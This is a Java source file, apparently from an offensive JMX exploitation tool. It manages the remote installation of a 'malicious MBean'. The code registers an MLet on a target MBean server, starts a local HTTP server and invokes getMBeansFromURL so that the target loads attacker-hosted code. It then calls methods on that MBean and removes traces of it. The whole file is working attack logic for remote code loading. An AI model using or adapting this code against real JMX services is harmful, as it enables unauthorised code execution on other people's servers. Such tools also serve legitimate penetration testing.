package fr.jrjgjk.mbeanhelpers;

import fr.jrjgjk.LocalServer;
import fr.jrjgjk.helpers.Printer;
import fr.jrjgjk.Config;

import javax.management.MBeanServerConnection;
import javax.management.MalformedObjectNameException;
import javax.management.ObjectName;
import javax.management.ObjectInstance;

public class MBeanOpManager{
	private ObjectName mbeanName = null;
	private ObjectName mLet = null;
	private MBeanServer mBeanServer = null;

	public MBeanOpManager(String mLetName, String mBeanName) throws MalformedObjectNameException {
		this.mLet = new ObjectName(mLetName);
		this.mbeanName = new ObjectName(mBeanName);
	}

	public void installMBeanMlet(MBeanServerConnection mbeanServerConn){
		try{
			if(!mbeanServerConn.isRegistered(this.mLet)){
				Printer.info("Registering new MLet '" + Config.mBeanLetName + "'");
				ObjectInstance registeredObject = mbeanServerConn.createMBean(Config.mBeanLetName, null);
				Printer.info("Mlet objectName: " + Printer.color(registeredObject.getObjectName().toString(), Printer.DEBUG));
				Printer.vinfo("Overriding default MletName with this one...");
				this.mLet = registeredObject.getObjectName();
			}
		} catch(javax.management.InstanceAlreadyExistsException ex){
			Printer.vinfo("Class already installed!");
		} catch(Exception ex){
			Printer.err("Failed...");
			ex.printStackTrace();
			System.exit(1);
		}
		Printer.log("Done!");
	}

	public Object invokeMBeanMethod(MBeanServerConnection mbeanServerConn, String methodName, Object[] params) {
		Object res = null;
		try{
			if(methodName.equals("getMBeansFromURL") || !mbeanServerConn.isRegistered(this.mbeanName)){
				// Start special treatment for this method :P
				if(this.mBeanServer == null){
					throw new java.lang.NullPointerException("Uninitialized Local Server, use -sh and -sp arguments");
				}

				this.mBeanServer.startHttpServer();
				res = mbeanServerConn.invoke(this.mLet, "getMBeansFromURL", params, new String[] { String.class.getName() });
				this.mBeanServer.stopHttpServer();

				if(!mbeanServerConn.isRegistered(this.mbeanName)){
					Printer.err("Unfortunately " + this.mbeanName.toString() + " failed to be installed...");
					Printer.verr("Reason was: " + res.toString());
					this.removeMBeanMLet(mbeanServerConn);
					System.exit(1);
				}

			} else {
				res = mbeanServerConn.invoke(this.mbeanName, methodName, params, new String[] { String.class.getName() });
	  		}
		} catch(Exception ex){
			Printer.err("Failed...");
			ex.printStackTrace();
			System.exit(1);
		}
		return res;
	}

	public Object invokeMBeanMethodNoFail(MBeanServerConnection mbeanServerConn, String methodName, Object[] params, String[] type) {
		Object res = null;
		try{
			res = mbeanServerConn.invoke(this.mbeanName, methodName, params, type);
		} catch(Exception ex){
			Printer.err("Failed with error: " + ex.getMessage());
		}
		return res;
	}

	public void installMBeanFromUrl(MBeanServerConnection mbeanServerConn)
	{
		this.invokeMBeanMethod(mbeanServerConn, "getMBeansFromURL", new Object[] { this.mBeanServer.getUrl() });
	}

	public void setMBeanServer(LocalServer lServer){
		this.mBeanServer = new MBeanServer(lServer);
	}

	public boolean isMLetInstalled(MBeanServerConnection mbeanServerConn) throws java.io.IOException {
		return mbeanServerConn.isRegistered(this.mLet);
	}

	public boolean isMaliciousMBeanInstalled(MBeanServerConnection mbeanServerConn) throws java.io.IOException {
		return mbeanServerConn.isRegistered(this.mbeanName);
	}

	public void removeMBeanMLet(MBeanServerConnection mbeanServerConn){
		try{
			if(this.isMLetInstalled(mbeanServerConn)){
				mbeanServerConn.unregisterMBean(this.mLet);
				Printer.log("Successfully cleaned MBean!");
			} else {
				Printer.err("Trying to remove something that wasn't here??");
				Printer.verr("Skipping..");
			}
		} catch(Exception ex) {
			Printer.err("Failed...");
			ex.printStackTrace();
			System.exit(0);
		}
	}

	public void cleanAll(MBeanServerConnection mbeanServerConn){
		this.uninstallMBean(mbeanServerConn);
		this.removeMBeanMLet(mbeanServerConn);
	}

	public void uninstallMBean(MBeanServerConnection mbeanServerConn){
		try{
			if(this.isMaliciousMBeanInstalled(mbeanServerConn)){
				mbeanServerConn.unregisterMBean(this.mbeanName);
				Printer.vlog(this.mbeanName.toString() + " has been uninstalled successfully!");
			} else {
				Printer.err("Removing something that does not exists..");
				Printer.verr("Skipping..");
			}
		} catch (Exception ex){
			Printer.err("Failed...");
			ex.printStackTrace();
			System.exit(1);
		}
	}

}